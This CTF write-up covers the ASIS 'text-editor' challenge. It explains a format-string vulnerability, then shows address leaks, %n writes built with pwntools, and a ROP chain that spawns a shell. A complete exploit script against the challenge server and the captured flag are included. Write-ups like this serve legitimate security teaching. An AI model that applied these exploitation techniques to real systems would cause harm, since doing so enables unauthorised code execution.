# text-editor

## Challenge

Connecting to the challenge presents the following prompt:

```
Welcome to simple text editor!
Menu:
1. edit text
2. save text
3. exit
> 
```

The program is very simple.
We can edit text in a static buffer and copy this text to a stack buffer.

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution

When `edit text` is selected, the program reads 0x108 bytes from stdin and copies this into a static buffer.

However, the 8 bytes at offset 0x100 in this buffer are used as arg1 to printf when printing an error.
This error is triggered when selecting a menu option that does not exist (e.g. option 0).

By overwriting this pointer, we can pass a different format string argument to printf.
However, PIE and ASLR are enabled, so we do not know what address to overwrite it with.

By overwriting the lowest 2 bytes, we can have a 1 in 16 chance of pointing this argument at our static buffer.
This would give us control over the contents of the format string.

We can improve the chances of success further.
If we overwrite the pointer and the program does not crash, but prints unexpected values, we can use this to determine where we have landed.
From there, we can calculate the correct offset to the static buffer and overwrite the pointer again with the correct value.
This gives us a 1 in 4 chance of success.

Once we have control over the format string parameter, we can leak addresses.
In this exploit, the libc address and stack address were used.

`save text` allows us to copy the static buffer onto the stack.
This is useful for providing printf with addresses to write to, using stack arguments and the `%n` conversion specifier.

We can use the pwntools `fmtstr_payload` function to automatically generate a payload for our desired writes.

We want our ROP chain at the start of the stack buffer if possible.
We also want the format string to print first, as null bytes in the ROP chain would cause it to be ignored.

Both are possible, as we can have different payloads in the static buffer and in the stack buffer.
In the stack buffer, we place our ROP chain, followed by the format string payload.
We then place the format string payload at the start of our static buffer as well.
The static buffer will be passed to printf, but we will have access to the ROP chain and addresses in the stack buffer.

We use an 8 byte overwrite to change the return address to enter our ROP chain.
Our ROP chain then calls `system("/bin/sh")` to spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 45.153.243.57 --port 13337 stuff/chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'stuff/chall')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '45.153.243.57'
port = int(args.PORT or 13337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def show_error():
    io.sendlineafter(b'> ', b'0')

def edit_text(text):
    io.sendlineafter(b'> ', b'1')
    io.sendafter(b': ', text)

def save_text():
    io.sendlineafter(b'> ', b'2')

payload = flat({
    0x0: b'X',
    0x100: p16(0x8020),
})
edit_text(payload)
show_error()

first = io.recv(1)

print(first)

offset = 0
if first == b'X':
    offset = 0
elif first == b'\xff':
    offset = -0x3000 
elif first == b'\x40':
    offset = -0x4000
elif first == b'\x2e':
    print("HIT .")
    payload = flat({
        0x0: b'X',
        0x100: p16(0x9020),
    })
    edit_text(payload)
    show_error()

    first = io.recv(1)
    if first == b'X':
        offset = -0x1000
    else:
        offset = -0x2000


print(hex(offset))

payload = flat({
    0x100: p16(0x8020 - offset),
})
io.sendlineafter(b'> ', b'1')
io.sendafter(b': ', payload)

payload = b'%6$p\0'
edit_text(payload)
show_error()
stack = int(io.recvuntil(b'M', drop=True), 0) - 0x130
print("stack: " + hex(stack))

payload = b'%7$p\0'
edit_text(payload)
show_error()
exe.address = int(io.recvuntil(b'M', drop=True), 0) - 0x1406
print("exe: " + hex(exe.address))

payload = b'%45$p\0'
edit_text(payload)
show_error()
libc.address = int(io.recvuntil(b'M', drop=True), 0) - libc.libc_start_main_return
print("libc: " + hex(libc.address))

rop = ROP(libc)

fmtstr = fmtstr_payload(10 + 16, {stack + 8: rop.find_gadget(['pop r13', 'pop r14', 'ret']).address}, write_size='short')

rop.call('system', [next(libc.search(b'/bin/sh'))])

edit_text(flat({0: rop.chain(), 128: fmtstr}))
save_text()

edit_text(fmtstr)
show_error()

io.interactive()
```

## Flag

```
ASIS{text_editing_has_never_been_so_fun_d1fd2}
```
